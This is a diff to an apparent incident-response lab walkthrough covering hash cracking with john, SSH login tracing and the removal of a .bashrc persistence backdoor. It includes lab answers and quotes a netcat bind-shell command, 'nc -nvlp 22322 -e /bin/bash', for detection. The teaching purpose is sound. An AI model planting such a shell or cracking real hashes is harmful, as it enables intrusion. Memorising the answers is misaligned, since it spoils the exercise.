@@ -30,11 +30,36 @@ What is the username found in the leaked file? `admin`
 # Assessing credential strength
 
 Try and find out if the hash found is weak and if the attacker could have used methods like brute forcing to crack it. Rainbow table attacks are one of the ways used for breaking hash-based authentication. Hash values of most common passwords are generated and stored in files known as rainbow tables. When the plaintext version of a hashed password is needed, the hash gets compared to all the values in that table. One tool that performs such an attack is john. To use it, open the terminal and type the following command:
-
-john --wordlist=/usr/share/wordlists/rockyou.txt leaked_hash.txt > crackedpassword.txt
+`john --wordlist=/usr/share/wordlists/rockyou.txt leaked_hash.txt > crackedpassword.txt
 
 Save the output to a new _crackedpassword.txt_ file. Read the file to see if any hash got cracked.
 
----
+After cracking the file, what is the user's password? `admin`
+# Analyzing the intruder's attack pattern
 
-After cracking the file,what is the user's password?
+After figuring out that the attacker probably cracked the admin hash, it is safe to assume that those credentials were used to gain access to the system. Let's find out what service the attacker used to log in to the machine. The best approach is to check all running services and see if any of them could provide an entrypoint for the attacker. To do that, use the following command:
+`service --status-all
+
+This command will show all the services and their status.
+
+_Secure Shell (SSH)_ is cryptographic protocol that allows secure remote access to a host. If an attacker finds valid credentials, they could gain access to the host via SSH. To check the SSH connection established, read the _/var/log/lastlog_ file.
+`cat /var/log/lastlog
+
+From which IP address was the SSH connection established? `172.20.0.7`
+# Persistence Investigation
+
+As it is shown, in the previous step there was a SSH connection from the same IP that downloaded the _.pcapng_ file from the server.
+
+For mitigation purposes, it is good practice to shut down any running service that might have been compromised.
+
+Now that it is validated that the attacker gained access to the machine, it is crucial to find further damage that might have occurred. Commonly, after an attacker gains access, they will look to place persistence or backdoors on the machine to allow them to have access at all times. Use the _ps -aux_ command to check all running processes and look out for any suspicious process.
+`ps -aux
+
+Reading through the output, a command is displayed that is running **netcat** and listening in **port _22322_**, which executes _/bin/bash_, allowing the attacker to interact with a bash session:
+
+This means that the attacker is using this port to connect to the machine persistently. To find out which script or process is initiating **_nc_**, use `ack`. This tool will look through all the system files to find a specific pattern. The pattern in this case is the `nc` command shown below:
+`ack 'nc -nvlp 22322 -e /bin/bash'
+
+The '_nc -nvlp 22322 -e /bin/bash'_ command seems to be executed by the .bashrc file which is a script that gets executed each time a bash session is started. To confirm this, go to _.bashrc_ and read the file. Remove the backdoor by locating the _nc_ command and deleting it.
+
+Where is the .bashrc file located? `/home/kali/.bashrc`
